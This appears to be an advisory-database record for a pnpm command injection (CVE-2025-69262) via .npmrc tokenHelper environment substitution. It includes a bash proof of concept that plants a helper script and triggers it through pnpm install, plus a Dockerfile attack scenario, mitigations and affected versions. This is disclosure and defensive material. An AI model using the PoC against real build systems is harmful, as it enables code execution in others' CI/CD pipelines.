@@ -1,0 +1,607 @@
+advisory_id: GHSA-2phv-j68v-wwqx
+datasource_id: github_osv/GHSA-2phv-j68v-wwqx
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-2phv-j68v-wwqx/GHSA-2phv-j68v-wwqx.json
+aliases:
+  - CVE-2025-69262
+summary: |
+  pnpm vulnerable to Command Injection via environment variable substitution
+  ## Summary
+
+  A command injection vulnerability exists in pnpm when using environment variable substitution in `.npmrc` configuration files with `tokenHelper` settings. An attacker who can control environment variables during pnpm operations could achieve remote code execution (RCE) in build environments.
+
+  ## Affected Components
+
+  - **Package**: pnpm
+  - **Versions**: All versions using `@pnpm/config.env-replace` and `loadToken` functionality
+  - **File**: `pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts` - `loadToken()` function
+  - **File**: `pnpm/config/config/src/readLocalConfig.ts` - `.npmrc` environment variable substitution
+
+  ## Technical Details
+
+  ### Vulnerability Chain
+
+  1. **Environment Variable Substitution**
+     - `.npmrc` supports `${VAR}` syntax
+     - Substitution occurs in `readLocalConfig()`
+
+  2. **loadToken Execution**
+     - Uses `spawnSync(helperPath, { shell: true })`
+     - Only validates absolute path existence
+
+  3. **Attack Flow**
+  ```
+  .npmrc: registry.npmjs.org/:tokenHelper=${HELPER_PATH}
+     ↓
+  envReplace() → /tmp/evil-helper.sh
+     ↓
+  loadToken() → spawnSync(..., { shell: true })
+     ↓
+  RCE achieved
+  ```
+
+  ### Code Evidence
+
+  **`pnpm/config/config/src/readLocalConfig.ts:17-18`**
+  ```typescript
+  key = envReplace(key, process.env)
+  ini[key] = parseField(types, envReplace(val, process.env), key)
+  ```
+
+  **`pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts:60-71`**
+  ```typescript
+  export function loadToken(helperPath: string, settingName: string): string {
+    if (!path.isAbsolute(helperPath) || !fs.existsSync(helperPath)) {
+      throw new PnpmError('BAD_TOKEN_HELPER_PATH', ...)
+    }
+    const spawnResult = spawnSync(helperPath, { shell: true })
+    // ...
+  }
+  ```
+
+  ## Proof of Concept
+
+  ### Prerequisites
+  - Private npm registry access
+  - Control over environment variables
+  - Ability to place scripts in filesystem
+
+  ### PoC Steps
+
+  ```bash
+  # 1. Create malicious helper script
+  cat > /tmp/evil-helper.sh << 'SCRIPT'
+  #!/bin/bash
+  echo "RCE SUCCESS!" > /tmp/rce-log.txt
+  echo "TOKEN_12345"
+  SCRIPT
+  chmod +x /tmp/evil-helper.sh
+
+  # 2. Create .npmrc with environment variable
+  cat > .npmrc << 'EOF'
+  registry=https://registry.npmjs.org/
+  registry.npmjs.org/:tokenHelper=${HELPER_PATH}
+  EOF
+
+  # 3. Set environment variable (attacker controlled)
+  export HELPER_PATH=/tmp/evil-helper.sh
+
+  # 4. Trigger pnpm install
+  pnpm install  # RCE occurs during auth
+
+  # 5. Verify attack
+  cat /tmp/rce-log.txt
+  ```
+
+  ### PoC Results
+  ```
+  ==> Attack successful
+  ==> File created: /tmp/rce-log.txt
+  ==> Arbitrary code execution confirmed
+  ```
+
+  ## Impact
+
+  ### Severity
+  - **CVSS Score**: 7.6 (High)
+  - **CVSS Vector**: cvss:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H
+
+  ### Affected Environments
+
+  **High Risk:**
+  - CI/CD pipelines (GitHub Actions, GitLab CI)
+  - Docker build environments
+  - Kubernetes deployments
+  - Private registry users
+
+  **Low Risk:**
+  - Public registry only
+  - Production runtime (no pnpm execution)
+  - Static sites
+
+  ### Attack Scenarios
+
+  **Scenario 1: CI/CD Supply Chain**
+  ```
+  Repository → Build Trigger → pnpm install → RCE → Production Deploy
+  ```
+
+  **Scenario 2: Docker Build**
+  ```dockerfile
+  FROM node:20
+  ARG HELPER_PATH=/tmp/evil
+  COPY .npmrc .
+  RUN pnpm install  # RCE
+  ```
+
+  **Scenario 3: Kubernetes**
+  ```
+  Secret Control → Env Variable → .npmrc Substitution → RCE
+  ```
+
+  ## Mitigation
+
+  ### Temporary Workarounds
+
+  **Disable tokenHelper:**
+  ```ini
+  # .npmrc
+  # registry.npmjs.org/:tokenHelper=${HELPER_PATH}
+  ```
+
+  **Use direct tokens:**
+  ```ini
+  //registry.npmjs.org/:_authToken=YOUR_TOKEN
+  ```
+
+  **Audit environment variables:**
+  - Review CI/CD env vars
+  - Restrict .npmrc changes
+  - Monitor build logs
+
+  ### Recommended Fixes
+
+  1. Remove `shell: true` from loadToken
+  2. Implement helper path allowlist
+  3. Validate substituted paths
+  4. Consider sandboxing
+
+  ## Disclosure
+
+  - **Discovery**: 2025-11-02
+  - **PoC**: 2025-11-02
+  - **Report**: [Pending disclosure decision]
+
+  ## References
+
+  - Repository: https://github.com/pnpm/pnpm
+  - Affected: `@pnpm/config.env-replace@^3.0.2`
+  - Similar: CVE-2024-53866, CVE-2023-37478
+
+  ## Credit
+
+  Reported by: Jiyong Yang
+  Contact: sy2n0@naver.com
+impacted_packages:
+  - purl: pkg:npm/pnpm
+    affected_versions: vers:npm/>=6.25.0|<10.27.0
+    fixed_versions: vers:npm/10.27.0
+    affected_packages:
+      - pkg:npm/pnpm@6.25.0
+      - pkg:npm/pnpm@6.25.1
+      - pkg:npm/pnpm@6.26.0
+      - pkg:npm/pnpm@6.26.1
+      - pkg:npm/pnpm@6.27.0
+      - pkg:npm/pnpm@6.27.1
+      - pkg:npm/pnpm@6.27.2
+      - pkg:npm/pnpm@6.28.0
+      - pkg:npm/pnpm@6.29.0
+      - pkg:npm/pnpm@6.29.1
+      - pkg:npm/pnpm@6.29.2
+      - pkg:npm/pnpm@6.30.0
+      - pkg:npm/pnpm@6.30.1
+      - pkg:npm/pnpm@6.31.0
+      - pkg:npm/pnpm@6.32.0
+      - pkg:npm/pnpm@6.32.1
+      - pkg:npm/pnpm@6.32.2
+      - pkg:npm/pnpm@6.32.3
+      - pkg:npm/pnpm@6.32.4
+      - pkg:npm/pnpm@6.32.5
+      - pkg:npm/pnpm@6.32.6
+      - pkg:npm/pnpm@6.32.7
+      - pkg:npm/pnpm@6.32.8
+      - pkg:npm/pnpm@6.32.9
+      - pkg:npm/pnpm@6.32.10
+      - pkg:npm/pnpm@6.32.11
+      - pkg:npm/pnpm@6.32.12
+      - pkg:npm/pnpm@6.32.13
+      - pkg:npm/pnpm@6.32.14
+      - pkg:npm/pnpm@6.32.15
+      - pkg:npm/pnpm@6.32.16
+      - pkg:npm/pnpm@6.32.17
+      - pkg:npm/pnpm@6.32.18
+      - pkg:npm/pnpm@6.32.19
+      - pkg:npm/pnpm@6.32.20
+      - pkg:npm/pnpm@6.32.21
+      - pkg:npm/pnpm@6.32.22
+      - pkg:npm/pnpm@6.32.23
+      - pkg:npm/pnpm@6.32.24
+      - pkg:npm/pnpm@6.32.25
+      - pkg:npm/pnpm@6.33.0
+      - pkg:npm/pnpm@6.33.1
+      - pkg:npm/pnpm@6.34.0
+      - pkg:npm/pnpm@6.35.0
+      - pkg:npm/pnpm@6.35.1
+      - pkg:npm/pnpm@7.0.0-alpha.0
+      - pkg:npm/pnpm@7.0.0-alpha.1
+      - pkg:npm/pnpm@7.0.0-alpha.2
+      - pkg:npm/pnpm@7.0.0-alpha.3
+      - pkg:npm/pnpm@7.0.0-alpha.4
+      - pkg:npm/pnpm@7.0.0-beta.0
+      - pkg:npm/pnpm@7.0.0-beta.1
+      - pkg:npm/pnpm@7.0.0-beta.2
+      - pkg:npm/pnpm@7.0.0-pr4475.0
+      - pkg:npm/pnpm@7.0.0-pr4475.1
+      - pkg:npm/pnpm@7.0.0-rc.0
+      - pkg:npm/pnpm@7.0.0-rc.1
+      - pkg:npm/pnpm@7.0.0-rc.2
+      - pkg:npm/pnpm@7.0.0-rc.3
+      - pkg:npm/pnpm@7.0.0-rc.4
+      - pkg:npm/pnpm@7.0.0-rc.5
+      - pkg:npm/pnpm@7.0.0-rc.6
+      - pkg:npm/pnpm@7.0.0-rc.7
+      - pkg:npm/pnpm@7.0.0-rc.8
+      - pkg:npm/pnpm@7.0.0-rc.9
+      - pkg:npm/pnpm@7.0.0
+      - pkg:npm/pnpm@7.0.1
+      - pkg:npm/pnpm@7.1.0
+      - pkg:npm/pnpm@7.1.1
+      - pkg:npm/pnpm@7.1.2
+      - pkg:npm/pnpm@7.1.3
+      - pkg:npm/pnpm@7.1.4
+      - pkg:npm/pnpm@7.1.5
+      - pkg:npm/pnpm@7.1.6
+      - pkg:npm/pnpm@7.1.7
+      - pkg:npm/pnpm@7.1.8
+      - pkg:npm/pnpm@7.1.9
+      - pkg:npm/pnpm@7.2.0
+      - pkg:npm/pnpm@7.2.1
+      - pkg:npm/pnpm@7.3.0
+      - pkg:npm/pnpm@7.4.0-0
+      - pkg:npm/pnpm@7.4.0-1
+      - pkg:npm/pnpm@7.4.0-2
+      - pkg:npm/pnpm@7.4.0-3
+      - pkg:npm/pnpm@7.4.0-4
+      - pkg:npm/pnpm@7.4.0
+      - pkg:npm/pnpm@7.4.1
+      - pkg:npm/pnpm@7.5.0
+      - pkg:npm/pnpm@7.5.1
+      - pkg:npm/pnpm@7.5.2
+      - pkg:npm/pnpm@7.6.0-0
+      - pkg:npm/pnpm@7.6.0
+      - pkg:npm/pnpm@7.7.0-0
+      - pkg:npm/pnpm@7.7.0-1
+      - pkg:npm/pnpm@7.7.0
+      - pkg:npm/pnpm@7.7.1
+      - pkg:npm/pnpm@7.8.0
+      - pkg:npm/pnpm@7.9.0-0
+      - pkg:npm/pnpm@7.9.0
+      - pkg:npm/pnpm@7.9.1
+      - pkg:npm/pnpm@7.9.2
+      - pkg:npm/pnpm@7.9.3
+      - pkg:npm/pnpm@7.9.4-0
+      - pkg:npm/pnpm@7.9.4
+      - pkg:npm/pnpm@7.9.5
+      - pkg:npm/pnpm@7.10.0-0
+      - pkg:npm/pnpm@7.10.0-1
+      - pkg:npm/pnpm@7.10.0
+      - pkg:npm/pnpm@7.11.0
+      - pkg:npm/pnpm@7.11.1-0
+      - pkg:npm/pnpm@7.12.0-0
+      - pkg:npm/pnpm@7.12.0
+      - pkg:npm/pnpm@7.12.1
+      - pkg:npm/pnpm@7.12.2
+      - pkg:npm/pnpm@7.13.0
+      - pkg:npm/pnpm@7.13.1
+      - pkg:npm/pnpm@7.13.2
+      - pkg:npm/pnpm@7.13.3
+      - pkg:npm/pnpm@7.13.4
+      - pkg:npm/pnpm@7.13.5
+      - pkg:npm/pnpm@7.13.6
+      - pkg:npm/pnpm@7.14.0
+      - pkg:npm/pnpm@7.14.1
+      - pkg:npm/pnpm@7.14.2
+      - pkg:npm/pnpm@7.15.0
+      - pkg:npm/pnpm@7.16.0
+      - pkg:npm/pnpm@7.16.1
+      - pkg:npm/pnpm@7.17.0
+      - pkg:npm/pnpm@7.17.1
+      - pkg:npm/pnpm@7.18.0
+      - pkg:npm/pnpm@7.18.1
+      - pkg:npm/pnpm@7.18.2
+      - pkg:npm/pnpm@7.19.0
+      - pkg:npm/pnpm@7.20.0
+      - pkg:npm/pnpm@7.21.0
+      - pkg:npm/pnpm@7.22.0
+      - pkg:npm/pnpm@7.23.0
+      - pkg:npm/pnpm@7.24.0
+      - pkg:npm/pnpm@7.24.1
+      - pkg:npm/pnpm@7.24.2
+      - pkg:npm/pnpm@7.24.3
+      - pkg:npm/pnpm@7.25.0
+      - pkg:npm/pnpm@7.25.1
+      - pkg:npm/pnpm@7.26.0
+      - pkg:npm/pnpm@7.26.1
+      - pkg:npm/pnpm@7.26.2
+      - pkg:npm/pnpm@7.26.3
+      - pkg:npm/pnpm@7.27.0-0
+      - pkg:npm/pnpm@7.27.0
+      - pkg:npm/pnpm@7.27.1
+      - pkg:npm/pnpm@7.28.0-0
+      - pkg:npm/pnpm@7.28.0
+      - pkg:npm/pnpm@7.29.0-1
+      - pkg:npm/pnpm@7.29.0-2
+      - pkg:npm/pnpm@7.29.0
+      - pkg:npm/pnpm@7.29.1
+      - pkg:npm/pnpm@7.29.2
+      - pkg:npm/pnpm@7.29.3
+      - pkg:npm/pnpm@7.30.0-0
+      - pkg:npm/pnpm@7.30.0
+      - pkg:npm/pnpm@7.30.1
+      - pkg:npm/pnpm@7.30.2
+      - pkg:npm/pnpm@7.30.3-0
+      - pkg:npm/pnpm@7.30.3
+      - pkg:npm/pnpm@7.30.4
+      - pkg:npm/pnpm@7.30.5
+      - pkg:npm/pnpm@7.31.0-0
+      - pkg:npm/pnpm@7.31.0
+      - pkg:npm/pnpm@7.32.0
+      - pkg:npm/pnpm@7.32.1
+      - pkg:npm/pnpm@7.32.2
+      - pkg:npm/pnpm@7.32.3
+      - pkg:npm/pnpm@7.32.4
+      - pkg:npm/pnpm@7.32.5
+      - pkg:npm/pnpm@7.33.0
+      - pkg:npm/pnpm@7.33.1
+      - pkg:npm/pnpm@7.33.2
+      - pkg:npm/pnpm@7.33.3
+      - pkg:npm/pnpm@7.33.4
+      - pkg:npm/pnpm@7.33.5
+      - pkg:npm/pnpm@7.33.6
+      - pkg:npm/pnpm@7.33.7
+      - pkg:npm/pnpm@8.0.0-alpha.0
+      - pkg:npm/pnpm@8.0.0-beta.0
+      - pkg:npm/pnpm@8.0.0-beta.1
+      - pkg:npm/pnpm@8.0.0-rc.0
+      - pkg:npm/pnpm@8.0.0-rc.1
+      - pkg:npm/pnpm@8.0.0
+      - pkg:npm/pnpm@8.1.0
+      - pkg:npm/pnpm@8.1.1
+      - pkg:npm/pnpm@8.2.0
+      - pkg:npm/pnpm@8.3.0-0
+      - pkg:npm/pnpm@8.3.0
+      - pkg:npm/pnpm@8.3.1
+      - pkg:npm/pnpm@8.4.0
+      - pkg:npm/pnpm@8.5.0
+      - pkg:npm/pnpm@8.5.1
+      - pkg:npm/pnpm@8.6.0
+      - pkg:npm/pnpm@8.6.1
+      - pkg:npm/pnpm@8.6.2
+      - pkg:npm/pnpm@8.6.3
+      - pkg:npm/pnpm@8.6.4
+      - pkg:npm/pnpm@8.6.5
+      - pkg:npm/pnpm@8.6.6
+      - pkg:npm/pnpm@8.6.7
+      - pkg:npm/pnpm@8.6.8
+      - pkg:npm/pnpm@8.6.9
+      - pkg:npm/pnpm@8.6.10
+      - pkg:npm/pnpm@8.6.11
+      - pkg:npm/pnpm@8.6.12
+      - pkg:npm/pnpm@8.7.0-1
+      - pkg:npm/pnpm@8.7.0-2
+      - pkg:npm/pnpm@8.7.0
+      - pkg:npm/pnpm@8.7.1
+      - pkg:npm/pnpm@8.7.2
+      - pkg:npm/pnpm@8.7.3
+      - pkg:npm/pnpm@8.7.4
+      - pkg:npm/pnpm@8.7.5
+      - pkg:npm/pnpm@8.7.6
+      - pkg:npm/pnpm@8.8.0
+      - pkg:npm/pnpm@8.9.0-0
+      - pkg:npm/pnpm@8.9.0-1
+      - pkg:npm/pnpm@8.9.0
+      - pkg:npm/pnpm@8.9.1
+      - pkg:npm/pnpm@8.9.2
+      - pkg:npm/pnpm@8.10.0-0
+      - pkg:npm/pnpm@8.10.0
+      - pkg:npm/pnpm@8.10.1
+      - pkg:npm/pnpm@8.10.2
+      - pkg:npm/pnpm@8.10.3
+      - pkg:npm/pnpm@8.10.4
+      - pkg:npm/pnpm@8.10.5
+      - pkg:npm/pnpm@8.11.0
+      - pkg:npm/pnpm@8.12.0
+      - pkg:npm/pnpm@8.12.1
+      - pkg:npm/pnpm@8.13.0
+      - pkg:npm/pnpm@8.13.1
+      - pkg:npm/pnpm@8.14.0
+      - pkg:npm/pnpm@8.14.1
+      - pkg:npm/pnpm@8.14.2
+      - pkg:npm/pnpm@8.14.3
+      - pkg:npm/pnpm@8.15.0
+      - pkg:npm/pnpm@8.15.1
+      - pkg:npm/pnpm@8.15.2
+      - pkg:npm/pnpm@8.15.3
+      - pkg:npm/pnpm@8.15.4
+      - pkg:npm/pnpm@8.15.5
+      - pkg:npm/pnpm@8.15.6
+      - pkg:npm/pnpm@8.15.7
+      - pkg:npm/pnpm@8.15.8
+      - pkg:npm/pnpm@8.15.9
+      - pkg:npm/pnpm@9.0.0-alpha.0
+      - pkg:npm/pnpm@9.0.0-alpha.1
+      - pkg:npm/pnpm@9.0.0-alpha.3
+      - pkg:npm/pnpm@9.0.0-alpha.4
+      - pkg:npm/pnpm@9.0.0-alpha.5
+      - pkg:npm/pnpm@9.0.0-alpha.6
+      - pkg:npm/pnpm@9.0.0-alpha.7
+      - pkg:npm/pnpm@9.0.0-alpha.8
+      - pkg:npm/pnpm@9.0.0-alpha.9
+      - pkg:npm/pnpm@9.0.0-alpha.10
+      - pkg:npm/pnpm@9.0.0-beta.0
+      - pkg:npm/pnpm@9.0.0-beta.1
+      - pkg:npm/pnpm@9.0.0-beta.2
+      - pkg:npm/pnpm@9.0.0-beta.3
+      - pkg:npm/pnpm@9.0.0-rc.0
+      - pkg:npm/pnpm@9.0.0-rc.1
+      - pkg:npm/pnpm@9.0.0-rc.2
+      - pkg:npm/pnpm@9.0.0
+      - pkg:npm/pnpm@9.0.1
+      - pkg:npm/pnpm@9.0.2
+      - pkg:npm/pnpm@9.0.3
+      - pkg:npm/pnpm@9.0.4
+      - pkg:npm/pnpm@9.0.5
+      - pkg:npm/pnpm@9.0.6
+      - pkg:npm/pnpm@9.1.0-0
+      - pkg:npm/pnpm@9.1.0
+      - pkg:npm/pnpm@9.1.1
+      - pkg:npm/pnpm@9.1.2
+      - pkg:npm/pnpm@9.1.3
+      - pkg:npm/pnpm@9.1.4
+      - pkg:npm/pnpm@9.2.0
+      - pkg:npm/pnpm@9.3.0
+      - pkg:npm/pnpm@9.4.0
+      - pkg:npm/pnpm@9.5.0-beta.0
+      - pkg:npm/pnpm@9.5.0-beta.1
+      - pkg:npm/pnpm@9.5.0-beta.2
+      - pkg:npm/pnpm@9.5.0-beta.3
+      - pkg:npm/pnpm@9.5.0
+      - pkg:npm/pnpm@9.6.0
+      - pkg:npm/pnpm@9.7.0
+      - pkg:npm/pnpm@9.7.1
+      - pkg:npm/pnpm@9.8.0
+      - pkg:npm/pnpm@9.9.0
+      - pkg:npm/pnpm@9.10.0
+      - pkg:npm/pnpm@9.11.0
+      - pkg:npm/pnpm@9.12.0
+      - pkg:npm/pnpm@9.12.1
+      - pkg:npm/pnpm@9.12.2
+      - pkg:npm/pnpm@9.12.3
+      - pkg:npm/pnpm@9.13.0
+      - pkg:npm/pnpm@9.13.1
+      - pkg:npm/pnpm@9.13.2
+      - pkg:npm/pnpm@9.14.0
+      - pkg:npm/pnpm@9.14.1
+      - pkg:npm/pnpm@9.14.2
+      - pkg:npm/pnpm@9.14.3
+      - pkg:npm/pnpm@9.14.4
+      - pkg:npm/pnpm@9.15.0
+      - pkg:npm/pnpm@9.15.1
+      - pkg:npm/pnpm@9.15.2
+      - pkg:npm/pnpm@9.15.3
+      - pkg:npm/pnpm@9.15.4
+      - pkg:npm/pnpm@9.15.5
+      - pkg:npm/pnpm@9.15.6
+      - pkg:npm/pnpm@9.15.7
+      - pkg:npm/pnpm@9.15.8
+      - pkg:npm/pnpm@9.15.9
+      - pkg:npm/pnpm@10.0.0-alpha.0
+      - pkg:npm/pnpm@10.0.0-alpha.1
+      - pkg:npm/pnpm@10.0.0-alpha.2
+      - pkg:npm/pnpm@10.0.0-alpha.3
+      - pkg:npm/pnpm@10.0.0-alpha.4
+      - pkg:npm/pnpm@10.0.0-beta.0
+      - pkg:npm/pnpm@10.0.0-beta.1
+      - pkg:npm/pnpm@10.0.0-beta.2
+      - pkg:npm/pnpm@10.0.0-beta.3
+      - pkg:npm/pnpm@10.0.0-rc.0
+      - pkg:npm/pnpm@10.0.0-rc.1
+      - pkg:npm/pnpm@10.0.0-rc.2
+      - pkg:npm/pnpm@10.0.0-rc.3
+      - pkg:npm/pnpm@10.0.0
+      - pkg:npm/pnpm@10.1.0
+      - pkg:npm/pnpm@10.2.0
+      - pkg:npm/pnpm@10.2.1
+      - pkg:npm/pnpm@10.3.0
+      - pkg:npm/pnpm@10.4.0
+      - pkg:npm/pnpm@10.4.1
+      - pkg:npm/pnpm@10.5.0
+      - pkg:npm/pnpm@10.5.1
+      - pkg:npm/pnpm@10.5.2
+      - pkg:npm/pnpm@10.6.0
+      - pkg:npm/pnpm@10.6.1
+      - pkg:npm/pnpm@10.6.2
+      - pkg:npm/pnpm@10.6.3
+      - pkg:npm/pnpm@10.6.4
+      - pkg:npm/pnpm@10.6.5
+      - pkg:npm/pnpm@10.7.0
+      - pkg:npm/pnpm@10.7.1
+      - pkg:npm/pnpm@10.8.0
+      - pkg:npm/pnpm@10.8.1
+      - pkg:npm/pnpm@10.9.0
+      - pkg:npm/pnpm@10.10.0
+      - pkg:npm/pnpm@10.11.0
+      - pkg:npm/pnpm@10.11.1
+      - pkg:npm/pnpm@10.12.0
+      - pkg:npm/pnpm@10.12.1
+      - pkg:npm/pnpm@10.12.2
+      - pkg:npm/pnpm@10.12.3
+      - pkg:npm/pnpm@10.12.4
+      - pkg:npm/pnpm@10.13.0
+      - pkg:npm/pnpm@10.13.1
+      - pkg:npm/pnpm@10.14.0-0
+      - pkg:npm/pnpm@10.14.0
+      - pkg:npm/pnpm@10.15.0
+      - pkg:npm/pnpm@10.15.1
+      - pkg:npm/pnpm@10.16.0
+      - pkg:npm/pnpm@10.16.1
+      - pkg:npm/pnpm@10.17.0
+      - pkg:npm/pnpm@10.17.1
+      - pkg:npm/pnpm@10.18.0
+      - pkg:npm/pnpm@10.18.1
+      - pkg:npm/pnpm@10.18.2
+      - pkg:npm/pnpm@10.18.3
+      - pkg:npm/pnpm@10.19.0
+      - pkg:npm/pnpm@10.19.1-oidc-test.0
+      - pkg:npm/pnpm@10.19.1-oidc-test.2
+      - pkg:npm/pnpm@10.19.1-oidc-test.3
+      - pkg:npm/pnpm@10.20.0
+      - pkg:npm/pnpm@10.21.0
+      - pkg:npm/pnpm@10.22.0
+      - pkg:npm/pnpm@10.23.0
+      - pkg:npm/pnpm@10.24.0
+      - pkg:npm/pnpm@10.25.0
+      - pkg:npm/pnpm@10.26.0
+      - pkg:npm/pnpm@10.26.1
+      - pkg:npm/pnpm@10.26.2
+    fixed_packages:
+      - pkg:npm/pnpm@10.27.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-2phv-j68v-wwqx/GHSA-2phv-j68v-wwqx.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+  - CWE-78
+references:
+  - url: https://github.com/pnpm/pnpm
+    reference_type:
+    reference_id:
+  - url: https://github.com/pnpm/pnpm/releases/tag/v10.27.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-69262
+    reference_type:
+    reference_id: CVE-2025-69262
+  - url: https://github.com/pnpm/pnpm/security/advisories/GHSA-2phv-j68v-wwqx
+    reference_type:
+    reference_id: GHSA-2phv-j68v-wwqx
+exploits: []
